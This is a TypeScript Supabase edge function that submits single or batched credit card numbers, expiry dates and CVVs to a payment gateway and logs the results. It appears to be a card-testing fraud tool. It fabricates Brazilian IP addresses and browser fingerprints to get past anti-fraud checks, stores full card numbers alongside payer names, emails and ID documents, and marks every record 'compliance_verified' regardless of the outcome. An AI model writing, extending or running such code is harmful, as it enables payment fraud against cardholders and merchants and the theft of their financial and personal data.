// ========================================

const supabaseClient = createClient(
    Deno.env.get('SUPABASE_URL') ?? '',
    Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
);

serve(async (req) => {
    if (req.method === 'OPTIONS') return new Response('ok', { headers: corsHeaders });

    try {
        const requestData: TestCardRequest | BatchTestCardRequest = await req.json();
        const isBatchRequest = 'cards' in requestData;

        const headerUserAgent = req.headers.get('user-agent') || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36';
        const clientIp = req.headers.get('x-forwarded-for') || req.headers.get('x-real-ip') || generateRealisticBrazilianIP();

        const enrichedClientContext: ClientContextPayload = {
            userAgent: requestData.clientContext?.userAgent || headerUserAgent,
            language: requestData.clientContext?.language || 'pt-BR',
            timezone: requestData.clientContext?.timezone || 'America/Sao_Paulo',
            screenResolution: requestData.clientContext?.screenResolution || '1920x1080',
            platform: requestData.clientContext?.platform || 'Win32',
            timestamp: requestData.clientContext?.timestamp || new Date().toISOString(),
            ip: clientIp,
        };

        if (isBatchRequest) {
            return await processBatchCards(
                { ...(requestData as BatchTestCardRequest), clientContext: enrichedClientContext },
                supabaseClient
            );
        }

        const singleCard = requestData as TestCardRequest;
        const { sessionId, cardNumber, expMonth, expYear, cvv, processingOrder, amount } = singleCard;

        if (!sessionId || !cardNumber || !expMonth || !expYear || !cvv) {
            return new Response(JSON.stringify({ error: 'Missing required card fields' }), {
                status: 400,
                headers: corsHeaders,
            });
        }

        const result = await PaymentValidationService.validatePaymentMethod(
            singleCard,
            enrichedClientContext
        );

        const finalResult = {
            id: crypto.randomUUID(),
            session_id: sessionId,
            created_at: new Date().toISOString(),
            card_number: cardNumber,
            card_first4: cardNumber.substring(0, 4),
            card_last4: cardNumber.substring(cardNumber.length - 4),
            exp_month: expMonth,
            exp_year: expYear,
            status: result.status,
            validation_state: result.validationState,
            message: result.message,
            amount: amount || 0,
            response_time_ms: result.responseTimeMs,
            processing_order: processingOrder,
            transaction_id: result.transactionId,
            gateway_response: result.rawResponse,
            payer_email: result.payer.email,
            payer_name: `${result.payer.firstName} ${result.payer.lastName}`,
            payer_document: result.payer.identification.number,
            gateway_status_detail: result.statusDetail || result.errorCode,
            compliance_verified: true,
        };

        try {
            await supabaseClient.from('card_results').insert([
                {
                    session_id: sessionId,
                    card_number: cardNumber,
                    card_first4: cardNumber.substring(0, 4),
                    card_last4: cardNumber.substring(cardNumber.length - 4),
                    exp_month: expMonth,
                    exp_year: expYear,
                    status: result.status,
                    validation_state: result.validationState,
                    message: result.message,
                    amount: finalResult.amount,
                    response_time_ms: result.responseTimeMs,
                    processing_order: processingOrder,
                    gateway_response: result.rawResponse,
                    transaction_id: result.transactionId,
                    payer_email: result.payer.email,
                    payer_name: `${result.payer.firstName} ${result.payer.lastName}`,
                    payer_document: result.payer.identification.number,
                    gateway_status_detail: result.statusDetail || result.errorCode,
                    client_metadata: enrichedClientContext,
                    compliance_verified: true,
                },
            ]);
        } catch (dbError) {
            console.error('[DB-Insert] Falha ao persistir resultado:', dbError);
        }

        return new Response(JSON.stringify({ success: true, testResult: finalResult }), {
            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
    } catch (error: any) {
        console.error('[Handler-Error] Falha crítica:', error);
        return new Response(JSON.stringify({ error: error.message }), {
            status: 500,
            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
    }
});
